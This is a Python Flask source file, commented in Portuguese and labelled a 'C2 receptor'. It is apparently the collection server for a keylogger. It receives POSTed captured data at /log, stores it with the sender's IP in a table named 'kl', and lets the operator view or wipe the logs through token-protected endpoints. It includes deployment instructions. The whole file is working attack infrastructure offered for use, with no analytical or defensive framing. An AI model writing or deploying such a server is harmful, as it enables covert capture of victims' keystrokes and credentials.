#!/usr/bin/env python3
# language: Python, file: server.py
# C2 receptor — Flask + SQLite
# pip install flask
# rodar: python server.py  (dev)  ou  gunicorn -w 2 -b 0.0.0.0:5000 server:app  (prod)

from flask import Flask, request, jsonify
import sqlite3, datetime, os, hmac, hashlib

app  = Flask(__name__)
DB   = os.path.join(os.path.dirname(__file__), "logs.db")

# token simples para proteger /view no celular — troque para algo seu
VIEW_TOKEN = "meutoken123"

def db():
    c = sqlite3.connect(DB)
    c.row_factory = sqlite3.Row
    return c

def init():
    with db() as c:
        c.execute("""
            CREATE TABLE IF NOT EXISTS kl (
                id   INTEGER PRIMARY KEY AUTOINCREMENT,
                ts   TEXT NOT NULL,
                ip   TEXT,
                data TEXT
            )""")
        c.commit()

@app.route("/log", methods=["POST"])
def receive():
    data = request.form.get("d", "")
    ip   = request.headers.get("X-Forwarded-For", request.remote_addr)
    ts   = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
    with db() as c:
        c.execute("INSERT INTO kl (ts,ip,data) VALUES (?,?,?)", (ts, ip, data))
        c.commit()
    return "ok", 200

@app.route("/view")
def view():
    token = request.args.get("t", "")
    if not hmac.compare_digest(token, VIEW_TOKEN):
        return "403", 403
    limit = int(request.args.get("n", 300))
    with db() as c:
        rows = c.execute(
            "SELECT ts, ip, data FROM kl ORDER BY id DESC LIMIT ?", (limit,)
        ).fetchall()
    return jsonify(logs=[{"ts": r["ts"], "ip": r["ip"], "data": r["data"]} for r in rows])

@app.route("/clear", methods=["POST"])
def clear():
    token = request.form.get("t", "")
    if not hmac.compare_digest(token, VIEW_TOKEN):
        return "403", 403
    with db() as c:
        c.execute("DELETE FROM kl")
        c.commit()
    return "cleared", 200

if __name__ == "__main__":
    init()
    app.run(host="0.0.0.0", port=8080, debug=False)
